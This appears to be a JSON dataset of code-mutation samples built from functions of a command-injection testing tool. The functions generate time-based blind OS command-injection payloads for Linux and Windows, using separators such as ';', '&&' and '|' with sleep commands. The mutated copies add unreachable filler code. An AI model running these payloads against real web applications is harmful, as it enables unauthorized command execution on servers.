[
    {
        "func_name": "decision",
        "original": "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
        "mutated": [
            "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write \\'' + TAG + '\\'.length\"\\') do if %i==' + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(output_length) + ' -ne $str1 ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi'\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=$(echo ' + TAG + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(output_length) + ' -eq $str1 ]' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(output_length) + ' -ne $(echo ' + TAG + settings.SINGLE_WHITESPACE + pipe + \"tr -d '\\\\n' \" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload"
        ]
    },
    {
        "func_name": "decision_alter_shell",
        "original": "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(output_length) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + 'if [ ' + str(output_length) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'' + TAG + '\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} 